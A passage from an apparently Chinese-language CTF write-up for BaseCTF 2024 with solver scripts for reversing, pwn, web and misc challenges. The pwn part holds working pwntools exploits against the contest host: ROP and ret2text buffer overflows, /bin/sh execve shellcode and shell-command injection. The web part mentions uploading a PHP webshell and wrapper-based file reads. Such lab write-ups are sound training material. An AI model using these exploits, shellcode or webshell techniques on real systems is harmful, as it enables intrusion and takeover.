COLS<br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;w&#x27;</span>:  <span class="hljs-comment"># Up</span><br>            <span class="hljs-keyword">return</span> pos - COLS<br>        <span class="hljs-keyword">elif</span> direction == <span class="hljs-string">&#x27;a&#x27;</span>:  <span class="hljs-comment"># Left</span><br>            <span class="hljs-keyword">return</span> pos - <span class="hljs-number">1</span><br>        <span class="hljs-keyword">return</span> pos<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_valid</span>(<span class="hljs-params">pos</span>):<br>        <span class="hljs-keyword">if</span> pos &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> pos &gt;= ROWS * COLS:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        x, y = <span class="hljs-built_in">divmod</span>(pos, COLS)<br>        <span class="hljs-keyword">return</span> maze[x][y] != <span class="hljs-string">&#x27;$&#x27;</span><br>    <br>    queue = deque([(start_pos, <span class="hljs-string">&#x27;&#x27;</span>)])<br>    visited = <span class="hljs-built_in">set</span>()<br>    visited.add(start_pos)<br><br>    <span class="hljs-keyword">while</span> queue:<br>        current_pos, path = queue.popleft()<br>        <span class="hljs-keyword">if</span> current_pos == end_pos:<br>            <span class="hljs-keyword">return</span> path<br>        <br>        <span class="hljs-keyword">for</span> direction <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;dsaw&#x27;</span>:<br>            new_pos = move(current_pos, direction)<br>            <span class="hljs-keyword">if</span> is_valid(new_pos) <span class="hljs-keyword">and</span> new_pos <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                visited.add(new_pos)<br>                queue.append((new_pos, path + direction))<br>                <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 迷宫初始化</span><br>maze = [<br>    <span class="hljs-string">&quot;x$$$$$$$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;$$$$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$$$$&amp;$$&amp;$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$$$$&amp;$&amp;$$$&quot;</span>,<br>    <span class="hljs-string">&quot;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y&quot;</span><br>]<br><br><span class="hljs-comment"># 将迷宫数据转换为一维列表</span><br>ROWS = <span class="hljs-number">15</span><br>COLS = <span class="hljs-number">15</span><br>maze_1d = <span class="hljs-string">&#x27;&#x27;</span>.join(maze)<br><br><span class="hljs-comment"># 起点和终点</span><br>START = <span class="hljs-number">0</span><br>END = (ROWS - <span class="hljs-number">1</span>) * COLS + (COLS - <span class="hljs-number">1</span>)  <span class="hljs-comment"># 最后一行最后一列的位置</span><br><br><span class="hljs-comment"># 查找路径</span><br>path = find_path([maze_1d[i * COLS:(i + <span class="hljs-number">1</span>) * COLS] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(ROWS)], START, END)<br><span class="hljs-keyword">if</span> path:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;找到的路径：<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;没有找到路径&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>最后进行MD5加密就行</p>
<h3 id="baseplus"><a class="markdownIt-Anchor" href="#baseplus"></a> BasePlus</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># Secret array used in encoding</span><br>Secret = <span class="hljs-string">&#x27;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">encoded_str</span>):<br>    decoded_str = <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-comment"># Step 1: XOR each character with 0xE to undo the XOR applied during encoding</span><br>    xor_str = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(char) ^ <span class="hljs-number">0xE</span>) <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> encoded_str)<br><br>    <span class="hljs-comment"># Process the string in chunks of 4 characters</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(xor_str), <span class="hljs-number">4</span>):<br>        enc_chunk = xor_str[i:i+<span class="hljs-number">4</span>]<br><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># Reverse the Base64-like encoding using the Secret array</span><br>            v15 = (Secret.index(enc_chunk[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">2</span>) | (Secret.index(enc_chunk[<span class="hljs-number">1</span>]) &gt;&gt; <span class="hljs-number">4</span>)<br>            v16 = ((Secret.index(enc_chunk[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xF</span>) &lt;&lt; <span class="hljs-number">4</span>) | (Secret.index(enc_chunk[<span class="hljs-number">2</span>]) &gt;&gt; <span class="hljs-number">2</span>)<br>            v17 = ((Secret.index(enc_chunk[<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0x3</span>) &lt;&lt; <span class="hljs-number">6</span>) | Secret.index(enc_chunk[<span class="hljs-number">3</span>])<br><br>            <span class="hljs-comment"># Reconstruct the original characters</span><br>            decoded_str += <span class="hljs-built_in">chr</span>(v15)<br>            <span class="hljs-keyword">if</span> v16 != <span class="hljs-number">0</span>:<br>                decoded_str += <span class="hljs-built_in">chr</span>(v16)<br>            <span class="hljs-keyword">if</span> v17 != <span class="hljs-number">0</span>:<br>                decoded_str += <span class="hljs-built_in">chr</span>(v17)<br><br>        <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Error processing chunk: <span class="hljs-subst">&#123;enc_chunk&#125;</span> - <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">return</span> decoded_str<br><br><span class="hljs-comment"># Example usage</span><br>encoded_str = <span class="hljs-string">&quot;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&quot;</span><br>decoded_str = decode(encoded_str)<br><br><span class="hljs-keyword">if</span> decoded_str <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded string: <span class="hljs-subst">&#123;decoded_str&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decoding failed due to an error.&quot;</span>)<br><br></code></pre></td></tr></table></figure>
<h3 id="ez-xor"><a class="markdownIt-Anchor" href="#ez-xor"></a> Ez Xor</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">key_stream</span>(<span class="hljs-params">key, length</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;生成与输入数据长度相同的key stream&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i ^ key[i % <span class="hljs-built_in">len</span>(key)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length)])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_decrypt</span>(<span class="hljs-params">data, key_stream</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;对数据进行加密/解密操作&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([data[i] ^ key_stream[<span class="hljs-built_in">len</span>(data) - i - <span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data))])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attempt_decryption</span>(<span class="hljs-params">encrypted_data, key</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;尝试用给定的key解密数据&quot;&quot;&quot;</span><br>    key_stream_data = key_stream(key, <span class="hljs-built_in">len</span>(encrypted_data))<br>    decrypted = encrypt_decrypt(encrypted_data, key_stream_data)<br><br>    <span class="hljs-keyword">try</span>:<br>        flag = decrypted.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        <span class="hljs-keyword">if</span> flag.startswith(<span class="hljs-string">&quot;Base&quot;</span>):<br>            <span class="hljs-keyword">return</span> flag, <span class="hljs-string">&quot;可能的flag&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> flag, <span class="hljs-string">&quot;解密结果&quot;</span><br>    <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>        <span class="hljs-keyword">return</span> decrypted.<span class="hljs-built_in">hex</span>(), <span class="hljs-string">&quot;无法解码为ASCII，十六进制结果&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    encrypted_flag = (<br>        <span class="hljs-string">b&#x27;\x01\x09\x05\x25\x26\x2D\x0B\x1D&#x27;</span><br>        <span class="hljs-string">b&#x27;\x24\x7A\x31\x20\x1E\x49\x3D\x67&#x27;</span><br>        <span class="hljs-string">b&#x27;\x4D\x50\x08\x25\x2E\x6E\x05\x34&#x27;</span><br>        <span class="hljs-string">b&#x27;\x22\x40\x3B\x25&#x27;</span><br>    )<br><br>    key_value = <span class="hljs-number">7499608</span><br><br>    <span class="hljs-comment"># 定义不同格式的key</span><br>    keys = [<br>        struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, key_value),      <span class="hljs-comment"># 小端 32 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, key_value),      <span class="hljs-comment"># 大端 32 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, key_value)[:<span class="hljs-number">3</span>],  <span class="hljs-comment"># 小端 24 位</span><br>        struct.pack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, key_value)[<span class="hljs-number">1</span>:],  <span class="hljs-comment"># 大端 24 位</span><br>    ]<br><br>    <span class="hljs-keyword">for</span> i, key <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(keys):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n尝试 key <span class="hljs-subst">&#123;i + <span class="hljs-number">1</span>&#125;</span>: <span class="hljs-subst">&#123;key.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>        result, status = attempt_decryption(encrypted_flag, key)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;status&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
<h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2>
<h3 id="签个到吧"><a class="markdownIt-Anchor" href="#签个到吧"></a> 签个到吧</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># 设置连接信息</span><br>host = <span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span><br>port = <span class="hljs-number">33292</span><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(host, port)<br><br><span class="hljs-comment"># 发送和接收数据</span><br>p.sendline(<span class="hljs-string">b&#x27;cat /flag&#x27;</span>)<br>response = p.recvline()<br><span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># 继续其他的交互操作</span><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure>
<h3 id="echo"><a class="markdownIt-Anchor" href="#echo"></a> echo</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置连接信息</span><br>host = <span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span><br>port = <span class="hljs-number">40511</span><br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(host, port)<br><br><span class="hljs-comment"># 尝试使用 echo 和 bash 的 &lt; 操作符读取文件</span><br>p.sendline(<span class="hljs-string">b&#x27;echo $(&lt;/flag)&#x27;</span>)<br>response = p.recvline()<br><span class="hljs-built_in">print</span>(response.decode())<br><br><span class="hljs-comment"># 关闭连接</span><br>p.close()<br></code></pre></td></tr></table></figure>
<h3 id="我把她丢了"><a class="markdownIt-Anchor" href="#我把她丢了"></a> 我把她丢了</h3>
<p>填充使其溢出调用到bin/sh,就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">49516</span>)<br><br><span class="hljs-comment">#system_plt=elf.plt[&quot;system&quot;]</span><br>pop_rdi_ret=<span class="hljs-number">0x0000000000401196</span><br>main=<span class="hljs-number">0x000000000040124B</span><br>payload=<span class="hljs-number">0x78</span>*<span class="hljs-string">b&#x27;a&#x27;</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x0000000000402008</span>)+p64(<span class="hljs-number">0x000000000040120F</span>)+p64(main)<br><span class="hljs-comment">#寄存器地址-&gt;bin/sh调用到system最后进入main</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
<h3 id="re2text"><a class="markdownIt-Anchor" href="#re2text"></a> Re2text</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>, <span class="hljs-number">30147</span>)<br><br><span class="hljs-comment"># 构造 payload</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x40101A</span>)+p64(<span class="hljs-number">0x4011a4</span>)           <span class="hljs-comment"># 填充缓冲区</span><br><br><span class="hljs-comment"># 发送 payload</span><br>p.sendline(payload)<br><br><span class="hljs-comment"># 进入交互模式</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h3 id="shellcode_level0"><a class="markdownIt-Anchor" href="#shellcode_level0"></a> shellcode_level0</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 连接到远程服务</span><br>p = remote(<span class="hljs-string">&#x27;challenge.basectf.fun&#x27;</span>, <span class="hljs-number">49846</span>)<br><br><span class="hljs-comment"># Shellcode 是一段二进制代码，可以直接在内存中执行。这个 shellcode 会启动一个 /bin/sh shell。</span><br><br>shellcode = (<br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>            <span class="hljs-comment"># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span><br>    <span class="hljs-string">b&quot;\x50&quot;</span>                    <span class="hljs-comment"># push rax            ; 将 rax (0) 压入栈，作为 NULL 终止符</span><br>    <span class="hljs-string">b&quot;\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span> <span class="hljs-comment"># mov rbx, 0x68732f2f6e69622f ; 将 &quot;/bin//sh&quot; 存入 rbx</span><br>    <span class="hljs-string">b&quot;\x53&quot;</span>                    <span class="hljs-comment"># push rbx            ; 将 rbx (&quot;/bin//sh&quot;) 压入栈</span><br>    <span class="hljs-string">b&quot;\x48\x89\xe7&quot;</span>            <span class="hljs-comment"># mov rdi, rsp        ; 将栈指针 rsp 的值赋给 rdi，现在 rdi 指向 &quot;/bin//sh&quot;</span><br>    <span class="hljs-string">b&quot;\x48\x31\xf6&quot;</span>            <span class="hljs-comment"># xor rsi, rsi        ; 清空 rsi 寄存器 (rsi = 0)，表示 NULL</span><br>    <span class="hljs-string">b&quot;\x48\x31\xd2&quot;</span>            <span class="hljs-comment"># xor rdx, rdx        ; 清空 rdx 寄存器 (rdx = 0)，表示 NULL</span><br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>            <span class="hljs-comment"># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span><br>    <span class="hljs-string">b&quot;\xb0\x3b&quot;</span>                <span class="hljs-comment"># mov al, 0x3b        ; 将 0x3b (59) 赋给 al 寄存器，59 是 execve 的系统调用号</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span>                <span class="hljs-comment"># syscall             ; 触发系统调用，执行 execve(&quot;/bin/sh&quot;, NULL, NULL)</span><br>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2>
<h3 id="http-是什么呀"><a class="markdownIt-Anchor" href="#http-是什么呀"></a> HTTP 是什么呀</h3>
<p>?basectf=we1c%2500me</p>
<p>Base=fl@g</p>
<p><img src="../../images/basectf/basectf2024/http1.png" srcset="/img/loading.gif" lazyload alt="http1"></p>
<p><img src="../../images/basectf/basectf2024/http2.png" srcset="/img/loading.gif" lazyload alt="http2"></p>
<p><img src="../../images/basectf/basectf2024/http3.png" srcset="/img/loading.gif" lazyload alt="http3"></p>
<p>base解密得到flag</p>
<h3 id="喵喵喵-́ع"><a class="markdownIt-Anchor" href="#喵喵喵-́ع"></a> 喵喵喵´•ﻌ•`</h3>
<p><img src="/../../images/basectf/basectf2024/%E5%96%B5%E5%96%B5%E5%96%B5.png" srcset="/img/loading.gif" lazyload alt="喵喵喵"></p>
<h3 id="md5绕过欸"><a class="markdownIt-Anchor" href="#md5绕过欸"></a> md5绕过欸</h3>
<p><img src="/../../images/basectf/basectf2024/md5.png" srcset="/img/loading.gif" lazyload alt="md5"></p>
<h3 id="a-dark-room"><a class="markdownIt-Anchor" href="#a-dark-room"></a> A Dark Room</h3>
<p>直接查看源码得到flag</p>
<h3 id="upload"><a class="markdownIt-Anchor" href="#upload"></a> upload</h3>
<p>上传一句话木马，观看源码在uploads/，直接上传php即可</p>
<h3 id="aura-酱的礼物"><a class="markdownIt-Anchor" href="#aura-酱的礼物"></a> Aura 酱的礼物</h3>
<p>混了个二血😋</p>
<p>前两个一个是php伪协议，一个直接输入</p>
<p>第三个</p>
<p>我是用的是@进行重定向，然后用我自己的vps开个端口进行拼接就行（理论上不需要这么复杂，只是最先想到这个办法</p>
<p><img src="/../../images/basectf/basectf2024/aura.png" srcset="/img/loading.gif" lazyload alt="aura"></p>
<p>最后进行伪协议读取flag</p>
<p>// flag{c985afc7-50f1-44e5-87f0-221d081b9459}  Aura 酱有拿到一血吗？</p>
<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2>
<h3 id="你也喜欢圣物吗"><a class="markdownIt-Anchor" href="#你也喜欢圣物吗"></a> 你也喜欢圣物吗</h3>
<p>打开下来先用010打开图片看，底部有个base64的编码</p>
<p>提示去看LSB</p>
<p>利用stegsolve进行分析，得到key</p>
<p>解开第一层压缩包</p>
<p>第二层伪加密工具进行解密，打开进去滑到下面有个真的flag</p>
<h3 id="根本进不去啊"><a class="markdownIt-Anchor" href="#根本进不去啊"></a> 根本进不去啊!</h3>
<p><img src="/../../images/basectf/basectf2024/%E8%BF%9B%E4%B8%8D%E5%8E%BB.png" srcset="/img/loading.gif" lazyload alt="进不去"></p>
<p>dig的命令是进行域信息搜索器，找txt得到flag</p>
<h3 id="海上遇到了鲨鱼"><a class="markdownIt-Anchor" href="#海上遇到了鲨鱼"></a> 海上遇到了鲨鱼</h3>
<p>利用wireshark打开，http找到php,里面有flag,进行简单的反转得到flag</p>
<h3 id="正着看还是反着看呢"><a class="markdownIt-Anchor" href="#正着看还是反着看呢"></a> 正着看还是反着看呢？</h3>
<p>利用python读取图片文件，然后反转图片进行逆向</p>
<p>将文件拖到虚拟机，进行foremost，里面有压缩包解压得到flag</p>
<h3 id="base"><a class="markdownIt-Anchor" href="#base"></a> Base</h3>
<p>直接64，32进行解密</p>
<h3 id="签到dk-盾"><a class="markdownIt-Anchor" href="#签到dk-盾"></a> 签到！DK 盾！</h3>
<p>直接公众号发送就行</p>
<h3 id="人生苦短我用python"><a class="markdownIt-Anchor" href="#人生苦短我用python"></a> 人生苦短，我用Python</h3>
<p>其他部分都可以看着推，我这边放一下<strong>推算15</strong>的情况</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-comment"># 目标值</span><br>target_value = <span class="hljs-number">41378751114180610</span><br><br><span class="hljs-comment"># 我们已知的 flag 结构</span><br>flag = <span class="hljs-string">&#x27;BaseCTF&#123;s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x&#125;&#x27;</span><br><br><span class="hljs-comment"># 定义我们将尝试的字符集</span><br>charset = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span><br><br><span class="hljs-comment"># 计算函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_sum</span>(<span class="hljs-params">chars</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(chars))<br><br><span class="hljs-comment"># 生成所有可能的组合并测试</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">3</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br>    <span class="hljs-keyword">if</span> calculate_sum(candidate) == target_value:<br>        <span class="hljs-comment"># 找到符合条件的组合，更新 flag</span><br>        flag = flag[:<span class="hljs-number">17</span>] + candidate + flag[<span class="hljs-number">20</span>:]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found correct sequence: <span class="hljs-subst">&#123;candidate&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Correct flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid sequence found.&quot;</span>)<br><span class="hljs-comment">#得到flagimport itertools</span><br><br><span class="hljs-comment"># 目标值</span><br>target_value = <span class="hljs-number">41378751114180610</span><br><br><span class="hljs-comment"># 我们已知的 flag 